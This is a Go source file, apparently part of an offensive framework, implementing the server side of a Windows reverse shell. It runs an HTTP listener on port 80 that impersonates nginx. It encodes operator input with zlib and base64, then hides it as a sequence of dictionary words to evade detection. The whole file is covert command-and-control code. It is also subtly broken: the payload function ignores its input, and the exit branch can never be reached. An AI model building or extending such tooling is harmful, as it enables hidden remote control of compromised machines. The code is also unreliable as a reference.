package winrevshell

import (
	"bufio"
	"bytes"
	"compress/zlib"
	"context"
	b64 "encoding/base64"
	"fmt"
	"log"
	"math/rand"
	"net/http"
	"os"
	"strings"

	"github.com/NDJSec/Go_ShadowFramework/utils"
)

var port_listening int = 80
var message string
var running_exploit_handler bool = false
var quit bool

func WinRevShellServerHandler(UserInput string) {
	input := strings.ToLower(UserInput)
	if strings.Contains(input, "run") {
		fmt.Println("Running Server")
		go server()
		running_exploit_handler = true
		exploit_handler()
	}

}

func exploit_handler() {

	for running_exploit_handler {
		TestInput := bufio.NewScanner(os.Stdin)
		fmt.Print("Enter Test Input > ")
		TestInput.Scan()
		if TestInput.Text() != "" {
			message = createPayload(TestInput.Text())
			fmt.Println(message)
			message = createPayloadHTTPMessage()
			fmt.Println(message)
		} else if TestInput.Text() == "exit" {
			fmt.Println("Stopping Server")
			quit = true
		}
	}

}

func randInt(min int, max int) int {
	return min + rand.Intn(max-min)
}

func createPayload(msg string) string {
	var b bytes.Buffer
	z := zlib.NewWriter(&b)
	if _, err := z.Write([]byte(message)); err != nil {
		log.Fatal(err)
	}
	if err := z.Close(); err != nil {
		log.Fatal(err)
	}
	sEnc := b64.URLEncoding.EncodeToString(b.Bytes())

	return sEnc
}

func createPayloadHTTPMessage() string {
	payloadKey := randInt(1, 500)
	HTTPMessage := utils.GetWord(payloadKey) + " "
	for i := range message {
		messageKey := utils.GetAlphabetNumber(HTTPMessage)
		HTTPMessage += utils.GetWord(messageKey+i) + " "
	}
	return HTTPMessage
}

func send_response(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("User-Agent", "nginx")
	fmt.Fprintf(w, message)
}

func server() {
	m := http.NewServeMux()
	s := http.Server{Addr: ":80", Handler: m}

	if quit {
		fmt.Println("Server Stopped")
		s.Shutdown(context.Background())
		return
	} else {
		m.HandleFunc("/", send_response)

		if err := s.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			log.Fatal(err)
		}
	}

}

//http.HandleFunc("/", send_response)
//http.ListenAndServe(":80", nil)
